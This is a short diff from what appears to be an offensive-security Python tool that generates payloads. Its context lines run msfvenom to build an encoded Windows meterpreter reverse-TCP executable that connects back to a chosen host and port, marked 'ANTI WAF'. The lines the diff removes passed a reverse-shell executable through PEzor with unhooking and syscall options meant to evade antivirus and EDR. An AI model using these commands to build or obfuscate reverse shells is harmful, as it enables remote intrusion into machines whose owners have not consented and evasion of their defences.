@@ -1202,11 +1202,8 @@ while True:
          
          # ANTI WAF ----         
          command("msfvenom -p windows/meterpreter/reverse_tcp --platform Windows -e x86/shikata_ga_nai -i 127 LHOST=" + localIP + " LPORT=" + checkParams + " -f exe -o " + explDir + "/win_encoded_shell.exe >> arsenal.tmp 2>&1")
-         
-         command("chmod +X *.*")
-         
-         command("mv ./OUTCOME/win_x86_https_reverse_shell.exe ./OUTCOME/PEzor/win_x86_https_reverse_shell.exe")
-         command("bash ./OUTCOME/PEzor/PEzor.sh -sgn -unhook -syscalls win_x86_https_reverse_shell.exe")
+
+         command("chmod +X *.*")            
       prompt()
 
 # ------------------------------------------------------------------------------------- 
